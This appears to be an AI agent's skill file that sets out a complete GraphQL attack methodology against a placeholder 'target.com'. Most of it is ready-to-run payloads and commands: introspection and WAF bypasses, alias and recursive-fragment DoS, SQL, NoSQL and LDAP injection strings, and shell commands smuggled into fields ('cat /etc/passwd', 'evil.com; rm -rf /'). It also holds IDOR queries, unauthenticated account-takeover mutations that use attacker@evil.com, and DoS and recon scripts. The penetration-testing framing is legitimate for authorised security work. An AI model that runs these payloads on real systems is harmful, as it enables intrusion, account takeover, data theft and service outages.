---
name: graphql-attacks
description: ULTIMATE GraphQL attack methodology — introspection, batching/aliasing, auth bypass, injection, IDOR, depth exploitation, tool commands.
category: api
---

# GraphQL Attack Methodology — Complete Reference

## 1. Introspection Detection & Bypass

### Standard Introspection Queries
```graphql
# Full schema dump
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

### Minimal Introspection (Stealth)
```graphql
# Just query/mutation types
{ __schema { queryType { name } mutationType { name } } }

# Single type
{ __type(name: "User") { name fields { name type { name kind ofType { name } } } } }
```

### Introspection Bypass Techniques

#### Content-Type Variations
```bash
# application/graphql (bypasses some WAFs)
curl -X POST -H "Content-Type: application/graphql" \
  -d '{__schema{queryType{name}}}' https://target.com/graphql

# multipart/form-data (file upload endpoints)
curl -X POST -F "query={__schema{queryType{name}}}" https://target.com/graphql

# x-www-form-urlencoded
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  --data "query={__schema{queryType{name}}}" https://target.com/graphql
```

#### GET Request Introspection
```bash
# Some endpoints allow GET with query param
curl "https://target.com/graphql?query={__schema{queryType{name}}}"
curl "https://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"
```

#### Persisted Query Bypass
```bash
# If persisted queries are used (hash-based), try:
# 1. Find a valid hash from browser devtools
# 2. Try common hashes
# 3. Pollute cache with malicious query

# Test if persisted queries work without hash
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}}}"}' \
  -H "X-Apollo-Operation-Name: IntrospectionQuery" \
  https://target.com/graphql
```

#### Introspection Disabled Detection
```graphql
# Test with error-based detection
{ __schema { queryType { name } } }

# If returns "Introspection is disabled" or similar, try:
# 1. Field suggestions via errors
query { user(id: 1) { nonExistentField } }
# Error may reveal: "Did you mean 'email' or 'username'?"

# 2. Type system attacks
query { __typename }  # Often still works
```

## 2. Batching & Aliasing Attacks

### Query Batching (Multiple Operations in One Request)
```bash
# Send array of queries
curl -X POST -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"}]' \
  https://target.com/graphql
```

### Aliasing for Rate Limit Bypass
```graphql
# Single query, multiple aliases - counts as 1 request
query GetEmails {
  u1: user(id: 1) { email }
  u2: user(id: 2) { email }
  u3: user(id: 3) { email }
  u4: user(id: 4) { email }
  u5: user(id: 5) { email }
  # ... 100+ aliases in one request
}
```

### Alias-Based DoS (Resource Exhaustion)
```graphql
# Exponential alias expansion
query DoS {
  a1: expensiveField { nested { deep { data } } }
  a2: expensiveField { nested { deep { data } } }
  a3: expensiveField { nested { deep { data } } }
  # 1000+ aliases = massive resolver execution
}

# Recursive fragment DoS
fragment Recursive on Type {
  field {
    ...Recursive
  }
}
query { field { ...Recursive } }
```

### Batch Batching (Batch within Batch)
```graphql
# Combine batching + aliasing for maximum throughput
# Some servers process each batch item with full resolver cost
query {
  batch1: users(ids: [1,2,3,4,5]) { email }
  batch2: users(ids: [6,7,8,9,10]) { email }
  # ...
}
```

## 3. Resolver Authorization Bypass

### Top-Level vs Field-Level Auth Testing
```graphql
# Test if parent is protected but children are not
query {
  # This might be authorized
  user(id: 1) {
    # But these might not re-check auth
    posts { title content }
    comments { body }
    privateMessages { content }
    billingInfo { creditCard }
  }
}

# Test direct access to nested types
query {
  post(id: 1) {  # Might bypass user-level auth
    author { email }
    comments { author { email } }
  }
}
```

### Resolver-Level Auth Matrix
```bash
# For each type, test every field with different roles:
# 1. Unauthenticated
# 2. Authenticated (own data)
# 3. Authenticated (other user's data)
# 4. Admin
# 5. Different tenant

# Automated test template:
query TestAuth($id: ID!) {
  node(id: $id) {
    ... on User { email ssn }
    ... on Post { content author { email } }
    ... on Order { total items { price } }
  }
}
```

### Missing Auth on Internal Resolvers
```graphql
# Search for internal/admin-only types exposed
query {
  # These might not have auth checks
  debugInfo { version config }
  internalMetrics { cpu memory }
  adminUsers { email role }
  systemLogs { message level }
}
```

## 4. Field Suggestions Leak

### Error-Based Schema Discovery
```graphql
# Trigger field suggestions
query { user(id: 1) { nonExistentField } }
# Response: "Field 'nonExistentField' doesn't exist on type 'User'. Did you mean 'email', 'username', 'passwordHash', 'apiKey'?"

# Brute-force field names via suggestions
query { user(id: 1) { a } }
query { user(id: 1) { b } }
# ... iterate through alphabet

# Use fragments for char in {a..z}; do
   curl -X POST -H "Content-Type: application/json" \
     -d "{\"query\":\"{user(id:1){$char}}\"}" \
     https://target.com/graphql
 done
```

## 5. Nested Query Depth Exploitation

### Circular Reference Attacks
```graphql
# Friends of friends of friends...
query DeepCircular {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                id name email
              }
            }
          }
        }
      }
    }
  }
}

# If no depth limit, this explodes exponentially
```

### Depth Limit Bypass
```graphql
# Test depth limits with fragments
fragment Deep on User {
  friends { ...Deep }
}
query { user(id: 1) { ...Deep } }

# Try different depth parameters
query { user(id: 1) { friends(depth: 100) { id } } }
query { user(id: 1) { friends(limit: 1000) { id } } }
```

### Pagination Abuse
```graphql
# Test cursor/offset pagination for DoS
query {
  users(first: 10000) { edges { node { email } } }
  users(first: 10000, after: "cursor") { edges { node { email } } }
}
```

## 6. GraphQL Injection (NoSQLi, SQLi, etc.)

### MongoDB NoSQL Injection in Arguments
```graphql
# $where injection
query { users(filter: { $where: "this.password.match(/^admin/)") } { email } }

# $regex injection
query { users(filter: { email: { $regex: ".*", $options: "i" } }) { email } }

# $gt/$lt for enum bypass
query { users(filter: { role: { $gt: "" } }) { email role } }

# Operator injection via variables
query GetUsers($filter: JSON) { users(filter: $filter) { email } }
# Variables: {"filter": {"$where": "sleep(5000) || true"}}
```

### SQL Injection via GraphQL
```graphql
# If backend uses raw SQL in resolvers
query { user(id: "1' OR '1'='1") { email } }
query { users(search: "admin'--") { email } }

# In variables
query GetUser($id: ID!) { user(id: $id) { email } }
# Variables: {"id": "1 UNION SELECT password FROM users--"}
```

### LDAP Injection
```graphql
query { users(ldapFilter: "(cn=*)") { email } }
query { users(ldapFilter: "*)(cn=*"))(|(userPassword=*))") { email } }
```

### Command Injection via Arguments
```graphql
# If arguments passed to shell commands
query { exportData(format: "csv; cat /etc/passwd") { file } }
query { processImage(url: "http://evil.com; rm -rf /") { result } }
```

## 7. GraphQL IDOR / BOLA

### Cross-User Data Access
```graphql
# Test direct object references
query { user(id: 1337) { email ssn creditCard } }
query { post(id: 999) { content author { email } } }
query { order(id: 555) { items { price } total } }

# Test with different argument names
query { userById(id: 1337) { ... } }
query { getUser(userId: 1337) { ... } }
query { node(id: "VXNlcjoxMzM3") { ... on User { email } } }  # Global ID
```

### Multi-Tenant IDOR
```graphql
# Test tenant isolation
query { organization(id: 42) { users { email } } }
query { team(id: 99) { members { email } } }
query { project(id: 123) { contributors { email } } }

# Try tenant header injection
# Header: X-Tenant-ID: 42
query { users { email } }  # Might return tenant 42's users
```

### Field-Level IDOR
```graphql
# Some fields might have different auth
query {
  user(id: 1337) {
    publicProfile { name }      # Allowed
    privateProfile { email }    # Might be blocked
    billing { creditCard }      # Might be blocked
    apiKeys { key secret }      # Critical if accessible
  }
}
```

## 8. GraphQL Mutations Attack

### Missing Auth on Mutations
```graphql
# Test all mutations without auth
mutation { deleteUser(id: 1) { success } }
mutation { updateUser(id: 1, input: { email: "attacker@evil.com" }) { user { email } } }
mutation { changePassword(userId: 1, newPassword: "pwned") { success } }
mutation { inviteAdmin(email: "attacker@evil.com") { success } }
mutation { createApiKey(userId: 1, scopes: ["admin"]) { key } }
```

### Mass Assignment via Mutation
```graphql
# Test for hidden fields in input types
mutation {
  updateProfile(input: {
    name: "Test"
    email: "test@test.com"
    role: "admin"           # Hidden field?
    isVerified: true        # Hidden field?
    creditBalance: 999999   # Hidden field?
    tenantId: 99            # Hidden field?
  }) { user { role isVerified creditBalance } }
}

# Registration mass assignment
mutation {
  register(input: {
    email: "attacker@evil.com"
    password: "password"
    role: "admin"
    referralCode: "FREE_YEAR"
  }) { user { role } }
}
```

### Mutation CSRF via Query Batching
```graphql
# Some GraphQL endpoints accept GET for mutations (CSRF)
curl "https://target.com/graphql?mutation={updateEmail(email:\"attacker@evil.com\")}"

# Batch mutation + query to bypass origin checks
# If batch array is processed, CSRF token might only be checked once
[
  {"query":"{viewer{id}}"},
  {"mutation":"{updateEmail(email:\"attacker@evil.com\"){success}}"}
]
```

## 9. GraphQL API Discovery

### Complete Schema Enumeration
```bash
# 1. Full introspection (if enabled)
./graphql-map -u https://target.com/graphql -o schema.json

# 2. If introspection disabled, use field suggestions
# 3. Use Clairvoyance for blind schema discovery
clairvoyance -t https://target.com/graphql

# 4. Extract all types, fields, args, directives
# 5. Build attack surface map
```

### Disallowed Field Enumeration
```graphql
# Find fields that exist but return "access denied"
query {
  user(id: 1) {
    __typename
    ...AllFields
  }
}

fragment AllFields on User {
  id email username passwordHash apiKey secretToken
  ssn creditCard billingAddress
  internalNotes adminFlags
}
```

### Directive Discovery
```graphql
# Find custom directives
query {
  user @include(if: true) { email }
  user @skip(if: false) { email }
  user @customDirective(arg: "value") { email }
}

# Test directive bypass
query { user @deprecated(reason: "bypass") { email } }
```

## 10. Tool Commands

### graphql-map (Schema Mapping)
```bash
# Basic schema dump
graphql-map -u https://target.com/graphql -o schema.json

# With auth header
graphql-map -u https://target.com/graphql -H "Authorization: Bearer <token>" -o schema.json

# Save as GraphQL SDL
graphql-map -u https://target.com/graphql --sdl -o schema.graphql
```

### graphql-cop (Security Auditor)
```bash
# Audit schema for security issues
graphql-cop -s schema.json

# Audit live endpoint
graphql-cop -u https://target.com/graphql -H "Authorization: Bearer <token>"
```

### graphw00f (GraphQL Fingerprinting)
```bash
# Identify GraphQL engine/version
graphw00f -t https://target.com/graphql

# With custom headers
graphw00f -t https://target.com/graphql -H "Authorization: Bearer <token>"
```

### InQL (Burp Extension)
```bash
# Install via Burp BApp store
# Features:
# - GraphQL endpoint detection in proxy history
# - Introspection query builder
# - Mutation/Query templates
# - Auto-completion in Repeater
```

### Clairvoyance (Blind Schema Discovery)
```bash
# When introspection is disabled
clairvoyance -t https://target.com/graphql -o schema.json

# With custom wordlist
clairvoyance -t https://target.com/graphql -w custom-fields.txt

# With auth
clairvoyance -t https://target.com/graphql -H "Authorization: Bearer <token>"
```

### graphql-path-enum (Path Enumeration)
```bash
# Enumerate all query/mutation paths
graphql-path-enum -u https://target.com/graphql -d 5 -o paths.txt

# With rate limiting
graphql-path-enum -u https://target.com/graphql --rate-limit 10 -o paths.txt
```

### Custom Testing Scripts
```bash
# Batch alias DoS test
cat > batch_dos.py << 'EOF'
import requests, json
query = "query {" + " ".join([f"u{i}: user(id: {i}) {{ email }}" for i in range(1, 501)]) + "}"
r = requests.post("https://target.com/graphql", json={"query": query})
print(r.status_code, len(r.text))
EOF
python3 batch_dos.py
```

## 11. WAF Bypass for GraphQL

### Content-Type Bypass Matrix
```bash
# Test each Content-Type
for ct in "application/json" "application/graphql" "application/x-www-form-urlencoded" "multipart/form-data"; do
  curl -X POST -H "Content-Type: $ct" \
    -d '{"query":"{__schema{queryType{name}}}"}' \
    https://target.com/graphql
done
```

### HTTP Method Bypass
```bash
# GET with query parameter
curl "https://target.com/graphql?query={__schema{queryType{name}}}"

# POST with query in body vs variables
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}}}","variables":{}}' \
  https://target.com/graphql
```

### Encoding Bypasses
```bash
# URL encoding
curl "https://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# Double encoding
curl "https://target.com/graphql?query=%257B__schema%257BqueryType%257Bname%257D%257D%257D"

# Unicode normalization
# Replace { with %u007B, } with %u007D
```

### Persisted Query Bypass
```bash
# If using Automatic Persisted Queries (APQ)
# 1. Send query without hash, get hash back
# 2. Replay with hash
# 3. Try to register malicious query

# Test APQ registration
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}}}","extensions":{"persistedQuery":{"version":1}}}' \
  https://target.com/graphql
```

### GraphQL-Specific WAF Bypasses
```graphql
# Fragment obfuscation
fragment X on Query { __schema { queryType { name } } }
query { ...X }

# Variable obfuscation
query($q: String!) { __schema { queryType { name } } }
# Variables: {"q": "ignored"}

# Alias obfuscation
query { x: __schema { y: queryType { z: name } } }

# Directive spam
query @skip(if: false) @include(if: true) @custom { __schema { queryType { name } } }
```

## 12. Authentication & Authorization Testing Methodology

### Auth Flow Testing Checklist
```
[ ] Unauthenticated access to queries/mutations
[ ] Authenticated (low priv) access to high-priv fields
[ ] Cross-user data access (horizontal IDOR)
[ ] Cross-tenant data access (multi-tenant IDOR)
[ ] Role escalation via mutation (vertical IDOR)
[ ] Token/session validation on each resolver
[ ] JWT algorithm confusion (none, HS256->RS256)
[ ] OAuth state/PKCE validation
[ ] Session fixation via GraphQL login mutation
[ ] Password reset poisoning via mutation
[ ] 2FA bypass via mutation
```

### Authorization Matrix Testing
```bash
# For each role (anon, user, admin, superadmin, tenant-admin):
# Test access to:
# - All queries
# - All mutations
# - All fields on each type
# - All arguments on each field

# Automated matrix generation:
cat > auth_matrix.py << 'EOF'
import itertools
roles = ["anon", "user", "admin", "tenant_admin"]
types = ["User", "Post", "Order", "AdminPanel"]
fields = ["id", "email", "ssn", "creditCard", "delete", "create"]

for role, typ, field in itertools.product(roles, types, fields):
    print(f"Test: {role} -> {typ}.{field}")
EOF
python3 auth_matrix.py > test_matrix.txt
```

## 13. Injection Points

### Complete Injection Surface
| Location | Example | Test For |
|----------|---------|----------|
| **Query arguments** | `user(id: "1")` | SQLi, NoSQLi, IDOR |
| **Variables** | `query($id: ID!) { user(id: $id) }` | All injection types |
| **Fragments** | `fragment F on User { field(arg: "x") }` | Argument injection |
| **Directives** | `@customDirective(arg: "x")` | Directive argument injection |
| **Subscriptions** | `subscription { onMessage(filter: "x") }` | Filter injection |
| **Mutation input** | `input: { field: "x" }` | Mass assignment, injection |
| **Operation name** | `query GetUser { ... }` | Usually safe, but test |
| **Batch array items** | `[{query: "..."}, {query: "..."}]` | Per-item injection |

### Variable Injection Testing
```graphql
# Test variable type confusion
query Test($input: UserInput!) {
  createUser(input: $input) { user { email role } }
}

# Variables with type confusion:
# {"input": {"email": "test@test.com", "role": "admin"}}
# {"input": {"email": {"$ne": null}, "role": "admin"}}  # NoSQLi
# {"input": ["admin", "user"]}  # Array instead of object
```

## 14. Signed/Persisted Query Attacks

### Persisted Query Exploitation
```bash
# If app uses signed/whitelisted queries:
# 1. Extract valid signatures from browser
# 2. Try to register malicious query
# 3. Replay with modified variables

# Test query registration endpoint
curl -X POST https://target.com/graphql/register \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{deleteUser(id:1){success}}"}'

# Test signature validation bypass
# Modify query slightly, keep same signature
```

### Apollo Persisted Queries
```bash
# APQ flow:
# 1. Client sends {extensions: {persistedQuery: {version: 1, sha256Hash: "abc"}}}
# 2. Server responds with "PersistedQueryNotFound" if not registered
# 3. Client sends full query with same hash
# 4. Server caches and executes

# Attack: Register malicious query hash collision
# Or: Find valid hash in browser, modify variables only
```

## 15. Evidence Collection Format

### Required Evidence Per Finding
```
exploit/FXXX-graphql-<vuln-type>/
├── finding-summary.md           # One-line: what, where, impact
├── steps-to-reproduce.md        # Exact GraphQL operations
├── request-1.txt                # Raw HTTP request (with query/variables)
├── response-1.txt               # Raw HTTP response (headers + body)
├── query.graphql                # Formatted GraphQL query
├── variables.json               # Variables used
├── schema-extract.graphql       # Relevant schema portion
├── auth-context.md              # Role/token used for test
└── impact-evidence/             # Screenshots, data dumps
    ├── data-exfil.json
    └── unauthorized-access.png
```

### HTTP Request Format (Copy-Paste Ready)
```
POST /graphql HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json
Content-Length: 247

{"query":"query GetUser($id: ID!) { user(id: $id) { email ssn creditCard } }","variables":{"id":"1337"}}
```

### Response Format
```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 156

{"data":{"user":{"email":"victim@company.com","ssn":"123-45-6789","creditCard":"4111-1111-1111-1111"}}}
```

### Impact Documentation Template
```
Impact: [Concrete data accessed/action performed] by [GraphQL operation]

Demonstrated:
- [Evidence 1: e.g., "Extracted SSN and credit card of user 1337 via user(id: 1337) query"]
- [Evidence 2: e.g., "Modified admin user's email via updateUser mutation without admin role"]
- [Evidence 3: e.g., "Enumerated 500 user emails via alias batching in single request"]

Damage: [Business impact — PII exposure, account takeover, financial fraud, etc.]

CVSS: [Score with vector]
```

## 16. Quick Reference: Attack Priority Order

| Priority | Attack | Why First |
|----------|--------|-----------|
| **P0** | Introspection + full schema dump | Maps entire attack surface |
| **P0** | Auth bypass on mutations | Direct state change, account takeover |
| **P0** | IDOR/BOLA on queries | Immediate data exposure |
| **P1** | NoSQLi/SQLi in arguments | Data exfiltration, RCE potential |
| **P1** | Depth DoS / batch DoS | Availability impact |
| **P1** | Field suggestions leak | Schema discovery without introspection |
| **P2** | Mass assignment via mutations | Privilege escalation |
| **P2** | Directive/custom scalar abuse | Logic bypass |
| **P3** | Information disclosure (version, debug) | Low impact unless chained |

## 17. Automation Snippets

### Complete Recon Script
```bash
#!/bin/bash
TARGET="https://target.com/graphql"
TOKEN="Bearer <token>"
OUT="graphql-recon"

mkdir -p $OUT

# 1. Fingerprint
graphw00f -t $TARGET -H "Authorization: $TOKEN" | tee $OUT/fingerprint.txt

# 2. Introspection attempt
curl -X POST -H "Content-Type: application/json" -H "Authorization: $TOKEN" \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{name}}}"}' \
  $TARGET | jq . > $OUT/introspection.json

# 3. If introspection works, full dump
if [ $(cat $OUT/introspection.json | jq '.data.__schema.types | length') -gt 0 ]; then
  graphql-map -u $TARGET -H "Authorization: $TOKEN" -o $OUT/schema.json
  graphql-cop -s $OUT/schema.json | tee $OUT/cop-audit.txt
fi

# 4. Blind schema discovery if introspection fails
clairvoyance -t $TARGET -H "Authorization: $TOKEN" -o $OUT/blind-schema.json

# 5. Test mutations without auth
for mut in $(cat mutations.txt); do
  curl -X POST -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation{$mut}\"}" $TARGET | tee $OUT/mutation-$mut.txt
done

# 6. Batch alias test
python3 batch_test.py $TARGET "$TOKEN" | tee $OUT/batch-test.txt
```

### Mutation Discovery Wordlist
```text
# Common mutation names to test
createUser
updateUser
deleteUser
login
register
resetPassword
changePassword
updateEmail
inviteUser
createPost
updatePost
deletePost
createOrder
updateOrder
cancelOrder
createApiKey
revokeApiKey
upgradePlan
cancelSubscription
```

---

**Last Updated:** 2026
**Maintainer:** @graphql agent
**Skill Version:** 2.0 — Full methodology rewrite
